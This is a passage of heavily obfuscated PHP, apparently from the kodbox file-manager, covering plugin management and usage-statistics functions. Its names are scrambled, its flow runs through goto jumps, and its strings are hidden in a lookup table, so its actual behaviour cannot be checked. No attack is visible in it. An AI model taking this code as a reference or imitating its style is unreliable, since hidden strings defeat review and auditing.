Hook::trigger(ACTION); } public function appAllow($e¤ä»Å£›­, $f¼•—“§ô›, $aé¿ºÉ“´š = true) { $DÔ¨ÌŒ­òš =& $_SERVER[¹÷ˆ§éÒ°ú]; $c½çÒÙÍÎÑ = PLUGIN_DIR . $e¤ä»Å£›­ . $DÔ¨ÌŒ­òš[2206]; if (!is_array($f¼•—“§ô›) || !is_array($f¼•—“§ô›[$DÔ¨ÌŒ­òš[2204]]) || !is_file($c½çÒÙÍÎÑ) || $f¼•—“§ô›[$DÔ¨ÌŒ­òš[684]] != 1) { return !1; } if ($aé¿ºÉ“´š && !Action($DÔ¨ÌŒ­òš[2207])->checkAuth($e¤ä»Å£›­)) { return !1; } return !0; } public function unInstall($Bº¿¸÷Ãä‡) { $c‰§½‰…ÆÉ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d×¬¦¡±œİ = $this->loadList($Bº¿¸÷Ãä‡); if (file_exists(PLUGIN_DIR . $Bº¿¸÷Ãä‡)) { Hook::apply($Bº¿¸÷Ãä‡ . $c‰§½‰…ÆÉ[2208]); } $this->remove($d×¬¦¡±œİ[$c‰§½‰…ÆÉ[378]]); } public function changeStatus($dôª—ğõ¿ì, $CÛóõ…‡ÜÙ) { $D•ÉØ¼ÄÖ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dï¼ïŠä¤ª = $this->loadList($dôª—ğõ¿ì); if ($CÛóõ…‡ÜÙ) { Hook::apply($dôª—ğõ¿ì . $D•ÉØ¼ÄÖ[2209]); } $this->update($dï¼ïŠä¤ª[$D•ÉØ¼ÄÖ[378]], array($D•ÉØ¼ÄÖ[2210] => $CÛóõ…‡ÜÙ)); } public function appRegist($cå½¾Æ§Ü©, $Eêğœ×•á‚) { $c†œ˜ŸÒÂº =& $_SERVER[¹÷ˆ§éÒ°ú]; $b§¿Û×’¦Æ = $this->loadList($cå½¾Æ§Ü©); if ($b§¿Û×’¦Æ) { $this->update($b§¿Û×’¦Æ[$c†œ˜ŸÒÂº[378]], array($c†œ˜ŸÒÂº[2204] => $Eêğœ×•á‚)); } else { $BÛŞ‰ì÷´¼ = array($c†œ˜ŸÒÂº[38] => $cå½¾Æ§Ü©, $c†œ˜ŸÒÂº[2204] => $Eêğœ×•á‚, $c†œ˜ŸÒÂº[684] => 0, $c†œ˜ŸÒÂº[16] => $this->getConfigDefault($cå½¾Æ§Ü©)); $this->insert($BÛŞ‰ì÷´¼); } } public function getConfigDefault($dÕùˆ¹Û) { $FÔğ¡©Ğòä =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÔ½ÄÄíÇ = array(); $c™°²Âáì‘ = $this->getPackageJson($dÕùˆ¹Û); if (!$c™°²Âáì‘ && is_array($c™°²Âáì‘[$FÔğ¡©Ğòä[2211]])) { return $FÔ½ÄÄíÇ; } foreach ($c™°²Âáì‘[$FÔğ¡©Ğòä[2211]] as $F±Ó™Ìª¨ => $eÂÊó‡³±Ú) { if (!isset($eÂÊó‡³±Ú[$FÔğ¡©Ğòä[370]]) || isset($FÔ½ÄÄíÇ[$F±Ó™Ìª¨])) { continue; } $FÔ½ÄÄíÇ[$F±Ó™Ìª¨] = $eÂÊó‡³±Ú[$FÔğ¡©Ğòä[370]]; } return $FÔ½ÄÄíÇ; } public function getPackageJson($d†ã…ŠìÈÂ) { return Hook::apply($d†ã…ŠìÈÂ . $_SERVER[¹÷ˆ§éÒ°ú][2212]); } public function getConfig($D…‰ŒëÀÔŸ, $CìïÍº·åØ = false) { $BÔŒïöà„« =& $_SERVER[¹÷ˆ§éÒ°ú]; $b¹³º¹ÏßÑ = array(); $cÎ„¢ÛÚóÕ = $this->loadList($D…‰ŒëÀÔŸ); if ($cÎ„¢ÛÚóÕ && is_array($cÎ„¢ÛÚóÕ[$BÔŒïöà„«[16]])) { $b¹³º¹ÏßÑ = $cÎ„¢ÛÚóÕ[$BÔŒïöà„«[16]]; } if (!$b¹³º¹ÏßÑ || $CìïÍº·åØ) { $b¹³º¹ÏßÑ = $this->getConfigDefault($D…‰ŒëÀÔŸ); } return $b¹³º¹ÏßÑ; } public function setConfig($DÑ‹œ»´, $CßùÊ‚¦ñÜ = false) { goto d˜Ú–«Ë¢¹; EÛÔŠ³ÃƒÓ: $this->update($eïÓó•âçÜ[$cç‚è”æ×[378]], array($cç‚è”æ×[16] => $AĞ‹†ÙŠÇ¿)); goto C¹Ìøí±ò“; d˜Ú–«Ë¢¹: $cç‚è”æ× =& $_SERVER[¹÷ˆ§éÒ°ú]; $eïÓó•âçÜ = $this->loadList($DÑ‹œ»´); if (!$eïÓó•âçÜ) { return !1; } goto e×ÎÆ³†Å; e×ÎÆ³†Å: $AĞ‹†ÙŠÇ¿ = $eïÓó•âçÜ[$cç‚è”æ×[16]]; if ($CßùÊ‚¦ñÜ == !1) { $AĞ‹†ÙŠÇ¿ = array(); $CßùÊ‚¦ñÜ = $this->getConfigDefault($DÑ‹œ»´); } foreach ($CßùÊ‚¦ñÜ as $D§ÒñæÅ¶Í => $C·èà®ùæ) { $AĞ‹†ÙŠÇ¿[$D§ÒñæÅ¶Í] = is_string($C·èà®ùæ) ? trim($C·èà®ùæ) : $C·èà®ùæ; } goto EÛÔŠ³ÃƒÓ; C¹Ìøí±ò“: } public function viewList() { goto FéëùÀÀ¾‘; FéëùÀÀ¾‘: $eÈ‘ã„Ëé‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c½Ç¨šÙèª = $this->loadList(); $this->pluginScan($c½Ç¨šÙèª); goto CÛ•””ß¼; CÛ•””ß¼: $c½Ç¨šÙèª = $this->loadPluginList(); $C½¸µ”¢­ = array(); foreach ($c½Ç¨šÙèª as $B×‰ÄŠ—Ÿµ => $B§§ñÌ§îˆ) { unset($B§§ñÌ§îˆ[$eÈ‘ã„Ëé‰[2204]], $B§§ñÌ§îˆ[$eÈ‘ã„Ëé‰[16]]); $Dê¥¸ƒ¾Ê“ = PLUGIN_DIR . $B§§ñÌ§îˆ[$eÈ‘ã„Ëé‰[38]] . $eÈ‘ã„Ëé‰[2206]; if (!is_file($Dê¥¸ƒ¾Ê“)) { continue; } $EİÆ‘°± = Hook::apply($B§§ñÌ§îˆ[$eÈ‘ã„Ëé‰[38]] . $eÈ‘ã„Ëé‰[2212]); if (is_array($EİÆ‘°±)) { $C½¸µ”¢­[$B×‰ÄŠ—Ÿµ] = array_merge($B§§ñÌ§îˆ, $EİÆ‘°±); } } goto DáÊ®„÷©‚; DáÊ®„÷©‚: return $C½¸µ”¢­; goto Fµ÷éªéÛÂ; Fµ÷éªéÛÂ: } private function loadPluginList() { $CÕ‚ÀÙ·ƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fŞ‡†²é¡¼ = $this->loadList(); if (strtolower(MOD) == $CÕ‚ÀÙ·ƒ[2213]) { return $fŞ‡†²é¡¼; } $eš·¡à»‘ = Hook::trigger($CÕ‚ÀÙ·ƒ[2214], $fŞ‡†²é¡¼); if ($fŞ‡†²é¡¼ && !$eš·¡à»‘) { die; } return $eš·¡à»‘ ? $eš·¡à»‘ : $fŞ‡†²é¡¼; } private function pluginScan($Dğ©é…Ìì™) { $bÀã’†™Å“ =& $_SERVER[¹÷ˆ§éÒ°ú]; recursion_dir(PLUGIN_DIR, $A´Ô¶šÑä, $eÈÛ’ôí„, 0); foreach ($A´Ô¶šÑä as $Dõˆ¢ßß„’) { $bÁóëÄ³å = get_path_this($Dõˆ¢ßß„’); if (isset($Dğ©é…Ìì™[$bÁóëÄ³å]) || !file_exists($Dõˆ¢ßß„’ . $bÀã’†™Å“[2215]) || !file_exists($Dõˆ¢ßß„’ . $bÀã’†™Å“[2206])) { continue; } Hook::apply($bÁóëÄ³å . $bÀã’†™Å“[2209]); } } } goto D¸…—ÕİŒ; A§Ğß³ÖçÃ: class AnalysisModel extends ModelBaseLight { public function init($e‚Œ‡·Ğ¤ë) { $c±‹ ùŞ’ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CÕ‡Œ‰ ‚ƒ = array($c±‹ ùŞ’[548] => array($c±‹ ùŞ’[39] => $c±‹ ùŞ’[2023], $c±‹ ùŞ’[272] => array($c±‹ ùŞ’[222], $c±‹ ùŞ’[695], $c±‹ ùŞ’[2024], $c±‹ ùŞ’[2025])), $c±‹ ùŞ’[2026] => array($c±‹ ùŞ’[39] => $c±‹ ùŞ’[2027], $c±‹ ùŞ’[272] => array($c±‹ ùŞ’[222], $c±‹ ùŞ’[693], $c±‹ ùŞ’[2028], $c±‹ ùŞ’[2029], $c±‹ ùŞ’[2030]))); if (!isset($CÕ‡Œ‰ ‚ƒ[$e‚Œ‡·Ğ¤ë])) { return !1; } $this->optionType = $CÕ‡Œ‰ ‚ƒ[$e‚Œ‡·Ğ¤ë][$c±‹ ùŞ’[39]]; $this->field = $CÕ‡Œ‰ ‚ƒ[$e‚Œ‡·Ğ¤ë][$c±‹ ùŞ’[272]]; return !0; } public function listData($bâœµ‹ á = false, $aø÷™ÔŸ” = "\155\x6f\144\151\x66\171\124\151\155\145", $EˆØøãÉÀ = false) { return parent::listData($bâœµ‹ á, $aø÷™ÔŸ”, $EˆØøãÉÀ); } public function trendList($D…Ô’¬§¶‡) { goto EÈ‚ó²Œ£ò; EÈ‚ó²Œ£ò: $a¼©è½á¼“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e ÏÚÕ•ìë = $this->listData(); if ($e ÏÚÕ•ìë) { $AŒÃ‰÷´šÆ = end($e ÏÚÕ•ìë); $bé´ÇšÁ£ˆ = date($a¼©è½á¼“[2031], strtotime($a¼©è½á¼“[2032])); if ($AŒÃ‰÷´šÆ[$a¼©è½á¼“[222]] == $bé´ÇšÁ£ˆ) { return $e ÏÚÕ•ìë; } $CÊ£îÓİ = strtotime($AŒÃ‰÷´šÆ[$a¼©è½á¼“[222]]); } goto Dì˜Ë©Ú†; Dì˜Ë©Ú†: if (!isset($CÊ£îÓİ)) { $b“…ßÅÇÄ¸ = $D…Ô’¬§¶‡ == $a¼©è½á¼“[548] ? $a¼©è½á¼“[490] : $a¼©è½á¼“[747]; $CÊ£îÓİ = Model($b“…ßÅÇÄ¸)->min($a¼©è½á¼“[199]); } $f‘È•ÈÃ¬ô = $a¼©è½á¼“[2033] . ucfirst($D…Ô’¬§¶‡); $bˆ¹Á¨ïå = $this->dateList($CÊ£îÓİ); goto fáÇšµ; fáÇšµ: foreach ($bˆ¹Á¨ïå as $bé´ÇšÁ£ˆ) { $this->{$f‘È•ÈÃ¬ô}($bé´ÇšÁ£ˆ); } return $this->listData(); goto EÏÈÀ‹ëÔ; EÏÈÀ‹ëÔ: } private function dateList($D¹ğƒò¾¼Ç) { $Eº°„îË =& $_SERVER[¹÷ˆ§éÒ°ú]; $DšØšœÉã¶ = $D¹ğƒò¾¼Ç; $F©®ù¸ëÇ• = strtotime($Eº°„îË[2032]); $F“ Á·´Ï = array(); while ($DšØšœÉã¶ <= $F©®ù¸ëÇ•) { $F“ Á·´Ï[] = date($Eº°„îË[2031], $DšØšœÉã¶); $DšØšœÉã¶ = strtotime($Eº°„îË[2034], $DšØšœÉã¶); } return $F“ Á·´Ï; } public function _recordUser($eá‚Ã¥ĞÉ„ = '') { goto bÙº’à‹¾—; D°ê±´ãœ‰: $Dµ‡ë†æ¼ª = Model($Eê£‚à¢·[490])->where($DÀßŠí˜¤Ÿ)->count($Eê£‚à¢·[1427]); $DÀßŠí˜¤Ÿ[$Eê£‚à¢·[39]] = $Eê£‚à¢·[2037]; $a‘¯¹ÅÔ¯ì = Model($Eê£‚à¢·[2038])->where($DÀßŠí˜¤Ÿ)->count($Eê£‚à¢·[2039]); goto B¹‡”ô£; bÙº’à‹¾—: $Eê£‚à¢· =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÌÁ”Õì¼ = strtotime(date($Eê£‚à¢·[2035], strtotime($eá‚Ã¥ĞÉ„))); $fæåÎóÍŒ = strtotime(date($Eê£‚à¢·[2036], strtotime($eá‚Ã¥ĞÉ„))); goto AÅµ´Ö§ÙÙ; AÅµ´Ö§ÙÙ: $DÀßŠí˜¤Ÿ = array($Eê£‚à¢·[199] => array($Eê£‚à¢·[917], $fæåÎóÍŒ)); $a¨ä¬“ö¿¼ = Model($Eê£‚à¢·[490])->where($DÀßŠí˜¤Ÿ)->count($Eê£‚à¢·[1427]); $DÀßŠí˜¤Ÿ[$Eê£‚à¢·[199]] = array($Eê£‚à¢·[332], array($DÌÁ”Õì¼, $fæåÎóÍŒ)); goto D°ê±´ãœ‰; B¹‡”ô£: $B¨™ëˆáˆŠ = array($Eê£‚à¢·[222] => $eá‚Ã¥ĞÉ„, $Eê£‚à¢·[695] => (int) $a¨ä¬“ö¿¼, $Eê£‚à¢·[2024] => (int) $Dµ‡ë†æ¼ª, $Eê£‚à¢·[2025] => (int) $a‘¯¹ÅÔ¯ì); return $this->insert($B¨™ëˆáˆŠ); goto CæÅ´•´Œ¤; CæÅ´•´Œ¤: } public function _recordStore($d£İç¦˜’ø = '') { goto C±„ÃàĞ; A‰›ÜáÉó: $D¦–İñ©ƒ—[$eĞË‘íùÇ[382]] = 1; $CÕ±âœ¹òŠ = Model($eĞË‘íùÇ[747])->where($D¦–İñ©ƒ—)->sum($eĞË‘íùÇ[89]); $D¦–İñ©ƒ—[$eĞË‘íùÇ[382]] = 2; goto E§ÊÓÚùÀÏ; C±„ÃàĞ: $eĞË‘íùÇ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a§‚î‘¾’Ÿ = strtotime(date($eĞË‘íùÇ[2036], strtotime($d£İç¦˜’ø))); $D¦–İñ©ƒ— = array($eĞË‘íùÇ[199] => array($eĞË‘íùÇ[917], $a§‚î‘¾’Ÿ)); goto D¯š¬‚øÜ–; D¯š¬‚øÜ–: $Eî°ëä…³ = Model($eĞË‘íùÇ[433])->where($D¦–İñ©ƒ—)->sum($eĞË‘íùÇ[89]); $D¦–İñ©ƒ—[$eĞË‘íùÇ[381]] = 0; $Aê¸‰Ñ¶« = Model($eĞË‘íùÇ[747])->where($D¦–İñ©ƒ—)->sum($eĞË‘íùÇ[89]); goto A‰›ÜáÉó; E§ÊÓÚùÀÏ: $bçåÜĞõ¾ç = Model($eĞË‘íùÇ[747])->where($D¦–İñ©ƒ—)->sum($eĞË‘íùÇ[89]); $CÁç ¤š±É = array($eĞË‘íùÇ[222] => $d£İç¦˜’ø, $eĞË‘íùÇ[693] => (int) $Aê¸‰Ñ¶«, $eĞË‘íùÇ[2028] => (int) $Eî°ëä…³, $eĞË‘íùÇ[2029] => (int) $CÕ±âœ¹òŠ, $eĞË‘íùÇ[2030] => (int) $bçåÜĞõ¾ç); return $this->insert($CÁç ¤š±É); goto B÷ƒù¶Ã¥; B÷ƒù¶Ã¥: } public function trend($c–’µ½É, $e ¿İŞäÅó) { goto cÉÑ¼Í……ğ; d›Ô˜‹“ˆŞ: if ($C¨¥‰¥ù‰ && $e ¿İŞäÅó != $c‡¬ÍÕâÍ[1402]) { $C¡êË¤‹´¸ = $C¨¥‰¥ù‰[0][$c‡¬ÍÕâÍ[222]]; $F¨é½ë»äÕ = $this->validDate($e ¿İŞäÅó, $C¡êË¤‹´¸); $f…ËóÔëÚ’ = array(); $A†¬¥ãé¶· = array_to_keyvalue($C¨¥‰¥ù‰, $c‡¬ÍÕâÍ[222]); foreach ($F¨é½ë»äÕ as $Eò½Ù´…Şœ) { if (isset($A†¬¥ãé¶·[$Eò½Ù´…Şœ])) { $bƒ°æÕ¬•º = $A†¬¥ãé¶·[$Eò½Ù´…Şœ]; } else { $bƒ°æÕ¬•º = end($C¨¥‰¥ù‰); $bƒ°æÕ¬•º[$c‡¬ÍÕâÍ[222]] = $Eò½Ù´…Şœ; if ($c–’µ½É == $c‡¬ÍÕâÍ[548]) { $bƒ°æÕ¬•º[$c‡¬ÍÕâÍ[2024]] = $bƒ°æÕ¬•º[$c‡¬ÍÕâÍ[2025]] = 0; } } $f…ËóÔëÚ’[] = $bƒ°æÕ¬•º; } $C¨¥‰¥ù‰ = $f…ËóÔëÚ’; } $DÖÊÇŞˆîì = array($c‡¬ÍÕâÍ[548] => array($c‡¬ÍÕâÍ[695] => LNG($c‡¬ÍÕâÍ[2040]), $c‡¬ÍÕâÍ[2024] => LNG($c‡¬ÍÕâÍ[2041]), $c‡¬ÍÕâÍ[2025] => LNG($c‡¬ÍÕâÍ[2042])), $c‡¬ÍÕâÍ[2026] => array($c‡¬ÍÕâÍ[693] => LNG($c‡¬ÍÕâÍ[2043]), $c‡¬ÍÕâÍ[2028] => LNG($c‡¬ÍÕâÍ[2044]), $c‡¬ÍÕâÍ[2029] => LNG($c‡¬ÍÕâÍ[2045]), $c‡¬ÍÕâÍ[2030] => LNG($c‡¬ÍÕâÍ[2046]))); $FÒÌµÎªôÈ = array($c‡¬ÍÕâÍ[548] => $c‡¬ÍÕâÍ[2047], $c‡¬ÍÕâÍ[2026] => $c‡¬ÍÕâÍ[89]); goto cØ™­¯§î; cØ™­¯§î: if (empty($C¨¥‰¥ù‰)) { $Eò½Ù´…Şœ = date($c‡¬ÍÕâÍ[2031], strtotime($c‡¬ÍÕâÍ[2032])); $cë½ÑÆŠ§ = array($c‡¬ÍÕâÍ[222] => $Eò½Ù´…Şœ); foreach ($DÖÊÇŞˆîì[$c–’µ½É] as $b‘´™çöè => $F»ƒ¬íì›) { $cë½ÑÆŠ§[$b‘´™çöè] = 0; } $C¨¥‰¥ù‰[] = $cë½ÑÆŠ§; } $Eà«Ë–‰¼ö = array(); foreach ($C¨¥‰¥ù‰ as $F»ƒ¬íì›) { if ($c–’µ½É == $c‡¬ÍÕâÍ[2026] && $F»ƒ¬íì›[$c‡¬ÍÕâÍ[2028]] > $F»ƒ¬íì›[$c‡¬ÍÕâÍ[693]]) { $F»ƒ¬íì›[$c‡¬ÍÕâÍ[2028]] = $F»ƒ¬íì›[$c‡¬ÍÕâÍ[693]]; } foreach ($DÖÊÇŞˆîì[$c–’µ½É] as $b‘´™çöè => $Eæ‘ ’è“á) { $bƒ°æÕ¬•º = array($c‡¬ÍÕâÍ[222] => $F»ƒ¬íì›[$c‡¬ÍÕâÍ[222]], $c‡¬ÍÕâÍ[1332] => $Eæ‘ ’è“á); $bƒ°æÕ¬•º[$FÒÌµÎªôÈ[$c–’µ½É]] = isset($F»ƒ¬íì›[$b‘´™çöè]) ? $F»ƒ¬íì›[$b‘´™çöè] : 0; $Eà«Ë–‰¼ö[] = $bƒ°æÕ¬•º; } } goto c²½›¼¤; cÉÑ¼Í……ğ: $c‡¬ÍÕâÍ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->init($c–’µ½É)) { return !1; } $C¨¥‰¥ù‰ = $this->trendList($c–’µ½É); goto d›Ô˜‹“ˆŞ; c²½›¼¤: return $Eà«Ë–‰¼ö; goto F³¤”Á–İ®; F³¤”Á–İ®: } public function validDate($CÑÒâ§â§¿, $b½ïŠ‚³Ÿ) { goto B¥Ú¦òÌˆè; B¥Ú¦òÌˆè: $b…ëƒì®ää =& $_SERVER[¹÷ˆ§éÒ°ú]; $a”Ú’—º«‹ = date($b…ëƒì®ää[2031], strtotime($b…ëƒì®ää[2032])); $b¼ƒÁÎ¼ì… = array($a”Ú’—º«‹); goto CĞ•Úé¥…ò; CĞ•Úé¥…ò: switch ($CÑÒâ§â§¿) { case $b…ëƒì®ää[1409]: $FŠÅÉ‹Í‘ = mktime(0, 0, 0, date($b…ëƒì®ää[2048]), date($b…ëƒì®ää[2049]) - date($b…ëƒì®ää[1217]) + 7 - 7, date($b…ëƒì®ää[2050])); $cÁœÙö¶Ş = 0; do { $BŒƒ‡“ë¨É = date($b…ëƒì®ää[2031], $FŠÅÉ‹Í‘ - 3600 * 24 * 7 * $cÁœÙö¶Ş); $b¼ƒÁÎ¼ì…[] = $BŒƒ‡“ë¨É; $cÁœÙö¶Ş++; } while ($b½ïŠ‚³Ÿ < $BŒƒ‡“ë¨É); break; case $b…ëƒì®ää[1407]: $cÁœÙö¶Ş = 1; do { $C×ƒ…Â“â× = date($b…ëƒì®ää[2051], strtotime("\55\x20{$cÁœÙö¶Ş}\40\155\x6f\x6e\164\x68\163")); $b¼ƒÁÎ¼ì…[] = $C×ƒ…Â“â×; $cÁœÙö¶Ş++; } while ($b½ïŠ‚³Ÿ < $C×ƒ…Â“â×); break; case $b…ëƒì®ää[1716]: $Bî¦óğ­¯ò = (int) date($b…ëƒì®ää[2050], strtotime($b½ïŠ‚³Ÿ)); $f†›’ŒË‡´ = (int) date($b…ëƒì®ää[2050]); if ($Bî¦óğ­¯ò >= $f†›’ŒË‡´) { break; } for ($Bî¦óğ­¯ò; $Bî¦óğ­¯ò < $f†›’ŒË‡´; $Bî¦óğ­¯ò++) { $b¼ƒÁÎ¼ì…[] = $Bî¦óğ­¯ò . $b…ëƒì®ää[2052]; } break; default: break; } if ($b½ïŠ‚³Ÿ > end($b¼ƒÁÎ¼ì…)) { array_pop($b¼ƒÁÎ¼ì…); } sort($b¼ƒÁÎ¼ì…); goto c¦–¬¡¯ñé; c¦–¬¡¯ñé: return $b¼ƒÁÎ¼ì…; goto d¿´Éğİ—•; d¿´Éğİ—•: } public function listTable($DÆëóß˜š) { $DÍ­ÎßËâ = ucfirst($DÆëóß˜š); return Model($DÍ­ÎßËâ)->listData(); } public function option($FŠŞğ¶‡â) { $eŞ†íõŞ¨í = $_SERVER[¹÷ˆ§éÒ°ú][2053] . ucfirst($FŠŞğ¶‡â); return $this->{$eŞ†íõŞ¨í}(); } private function optionUser() { goto aİ¤¢ä‡¶Š; Cã«Ø˜Ê°„: $bÜ—ÇàÈå” = strtotime($E¤¬¢Âà¥[2055]); $DÃËóó¾î = array($E¤¬¢Âà¥[2056] => array($E¤¬¢Âà¥[918], $bÜ—ÇàÈå”)); $B®ĞŠñ³«º = (int) Model($E¤¬¢Âà¥[490])->where($DÃËóó¾î)->count($E¤¬¢Âà¥[1427]); goto a¨ÔÅ©ÆÈ; a¨ÔÅ©ÆÈ: if (!$B®ĞŠñ³«º) { $B®ĞŠñ³«º = 1; } $bÜ—ÇàÈå” = strtotime(date($E¤¬¢Âà¥[2035])); $DÃËóó¾î = array($E¤¬¢Âà¥[2056] => array($E¤¬¢Âà¥[918], $bÜ—ÇàÈå”)); goto eË‰ø¯‹õ; aİ¤¢ä‡¶Š: $E¤¬¢Âà¥ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Có½µÃ”µÀ = Model($E¤¬¢Âà¥[490])->count($E¤¬¢Âà¥[1427]); $EŞ¦’ğá“» = Model($E¤¬¢Âà¥[490])->where($E¤¬¢Âà¥[2054])->count($E¤¬¢Âà¥[1427]); goto Cã«Ø˜Ê°„; eË‰ø¯‹õ: $bà§®ñÑ¹ = Model($E¤¬¢Âà¥[490])->where($DÃËóó¾î)->count($E¤¬¢Âà¥[1427]); return array($E¤¬¢Âà¥[690] => (int) $Có½µÃ”µÀ, $E¤¬¢Âà¥[2057] => (int) ($Có½µÃ”µÀ - $EŞ¦’ğá“»), $E¤¬¢Âà¥[2058] => (int) $EŞ¦’ğá“», $E¤¬¢Âà¥[2059] => (int) $bà§®ñÑ¹, $E¤¬¢Âà¥[2060] => $B®ĞŠñ³«º); goto c²˜ŞƒÕìñ; c²˜ŞƒÕìñ: } private function optionFile() { goto D‡á»ã”µ¦; eâËğ¤‡É: $aùß‰…šœ = $EÒã˜²î—[$e»Òî’±¢Ô[2028]]; $DñÆ´©Ë¦Õ = Model($e»Òî’±¢Ô[747])->where(array($e»Òî’±¢Ô[381] => 0))->count($e»Òî’±¢Ô[380]); $EÔŒÇïéÌò = array($e»Òî’±¢Ô[381] => 0, $e»Òî’±¢Ô[199] => array($e»Òî’±¢Ô[918], strtotime(date($e»Òî’±¢Ô[2035])))); goto E—½ôİáöã; D‡á»ã”µ¦: $e»Òî’±¢Ô =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÒã˜²î— = $this->sourceSize(); $d¦…ÀŞâ÷Õ = $EÒã˜²î—[$e»Òî’±¢Ô[89]]; goto eâËğ¤‡É; E—½ôİáöã: $FÄà Èó” = Model($e»Òî’±¢Ô[747])->where($EÔŒÇïéÌò)->sum($e»Òî’±¢Ô[89]); $dæäè¢’ˆÆ = Model($e»Òî’±¢Ô[747])->where($EÔŒÇïéÌò)->count($e»Òî’±¢Ô[380]); return array($e»Òî’±¢Ô[693] => $d¦…ÀŞâ÷Õ, $e»Òî’±¢Ô[2028] => $aùß‰…šœ, $e»Òî’±¢Ô[2061] => $d¦…ÀŞâ÷Õ - $aùß‰…šœ, $e»Òî’±¢Ô[2062] => (int) $FÄà Èó”, $e»Òî’±¢Ô[695] => (int) $DñÆ´©Ë¦Õ, $e»Òî’±¢Ô[2063] => (int) $dæäè¢’ˆÆ); goto AìÜ­¬Ä•ø; AìÜ­¬Ä•ø: } private function optionAccess() { $BÔàˆõÅ­ =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($BÔàˆõÅ­[690] => $this->typeLogCnt(), $BÔàˆõÅ­[115] => $this->typeLogCnt($BÔàˆõÅ­[115]), $BÔàˆõÅ­[415] => $this->typeLogCnt($BÔàˆõÅ­[415]), $BÔàˆõÅ­[2064] => $this->typeLogCnt($BÔàˆõÅ­[2064]), $BÔàˆõÅ­[2065] => $this->typeLogCnt($BÔàˆõÅ­[2065]), $BÔàˆõÅ­[548] => $this->typeLogCnt($BÔàˆõÅ­[43], $BÔàˆõÅ­[2039])); } private function typeLogCnt($cºÀÚÔ“¶œ = '', $DÑÆ©„ƒÂ˜ = "\151\144") { goto c“˜ˆ©‡ñˆ; c“˜ˆ©‡ñˆ: $AÙ›˜ÒË¹™ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cæ¡ÕÚ­­¼ = array($AÙ›˜ÒË¹™[115] => array($AÙ›˜ÒË¹™[2066], $AÙ›˜ÒË¹™[2067]), $AÙ›˜ÒË¹™[415] => array($AÙ›˜ÒË¹™[2068], $AÙ›˜ÒË¹™[2069]), $AÙ›˜ÒË¹™[2064] => array($AÙ›˜ÒË¹™[2070], $AÙ›˜ÒË¹™[2071], $AÙ›˜ÒË¹™[2072]), $AÙ›˜ÒË¹™[2065] => array($AÙ›˜ÒË¹™[2073], $AÙ›˜ÒË¹™[2074]), $AÙ›˜ÒË¹™[2075] => array($AÙ›˜ÒË¹™[2076], $AÙ›˜ÒË¹™[2077], $AÙ›˜ÒË¹™[2078])); $eÉõÎÀ´ˆ = strtotime(date($AÙ›˜ÒË¹™[2035])); goto bÚ—ªŠæÒ©; bÚ—ªŠæÒ©: $cò†‰•×åä = array($AÙ›˜ÒË¹™[199] => array($AÙ›˜ÒË¹™[918], $eÉõÎÀ´ˆ)); if ($cºÀÚÔ“¶œ) { $cò†‰•×åä[$AÙ›˜ÒË¹™[39]] = array($AÙ›˜ÒË¹™[17], $cæ¡ÕÚ­­¼[$cºÀÚÔ“¶œ]); } $Bó…¶‰¹Ø› = Model($AÙ›˜ÒË¹™[2038])->where($cò†‰•×åä)->count($DÑÆ©„ƒÂ˜); goto bÑº¨è¡Ú…; bÑº¨è¡Ú…: return (int) $Bó…¶‰¹Ø›; goto C”å¶”É¶è; C”å¶”É¶è: } private function optionServer() { goto eœÕŠÚÙ…‡; bÅÁ™ÁÜ‰: if ($CôŒ·Ì°øÆ == $a˜İØò¤éÔ[718]) { $FáóèßìÎ = explode($a˜İØò¤éÔ[1067], $F™ÇŞ´ñ‡ˆ[$a˜İØò¤éÔ[877]]); $CôŒ·Ì°øÆ = $FáóèßìÎ[0]; } if ($CôŒ·Ì°øÆ == $a˜İØò¤éÔ[721] || $CôŒ·Ì°øÆ == $a˜İØò¤éÔ[722]) { $eÅ­ùöò°È = Model()->db()->query($a˜İØò¤éÔ[2079]); $B‚—Ô¬¸ªÒ = $eÅ­ùöò°È[0] && isset($eÅ­ùöò°È[0][$a˜İØò¤éÔ[1331]]) ? $eÅ­ùöò°È[0][$a˜İØò¤éÔ[1331]] : 0; $CôŒ·Ì°øÆ = $a˜İØò¤éÔ[2080] . ($B‚—Ô¬¸ªÒ ? $a˜İØò¤éÔ[18] . $B‚—Ô¬¸ªÒ : $a˜İØò¤éÔ[43]); } $Aàğ¬Ë¾†Ó = $GLOBALS[$a˜İØò¤éÔ[16]][$a˜İØò¤éÔ[348]][$a˜İØò¤éÔ[749]]; goto dÙÈÏÓíââ; E§’½‘ÈÄÚ: $c†«ËÓç¤§ = $dãÊ…Ÿ’³[0]; $F™ÇŞ´ñ‡ˆ = $GLOBALS[$a˜İØò¤éÔ[16]][$a˜İØò¤éÔ[27]]; $CôŒ·Ì°øÆ = $F™ÇŞ´ñ‡ˆ[$a˜İØò¤éÔ[878]]; goto bÅÁ™ÁÜ‰; EÑ’¾Ü¬‡ê: $C‰³‹…ÏŒ‡ = array($a˜İØò¤éÔ[738] => $bÙÁ†’Íôï[$a˜İØò¤éÔ[378]]); $BŒŠ™„ŒÑÈ = Model($a˜İØò¤éÔ[433])->where($C‰³‹…ÏŒ‡)->sum($a˜İØò¤éÔ[89]); $dãÊ…Ÿ’³ = explode($a˜İØò¤éÔ[60], $_SERVER[$a˜İØò¤éÔ[151]]); goto E§’½‘ÈÄÚ; eœÕŠÚÙ…‡: $a˜İØò¤éÔ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CÊŒìØ”¸¯ = $this->diskDriver(); $bÙÁ†’Íôï = KodIO::defaultDriver(); goto EÑ’¾Ü¬‡ê; dÙÈÏÓíââ: return array($a˜İØò¤éÔ[2081] => $CÊŒìØ”¸¯ ? $CÊŒìØ”¸¯[$a˜İØò¤éÔ[2082]] : 0, $a˜İØò¤éÔ[2083] => $CÊŒìØ”¸¯ ? $CÊŒìØ”¸¯[$a˜İØò¤éÔ[2084]] : 0, 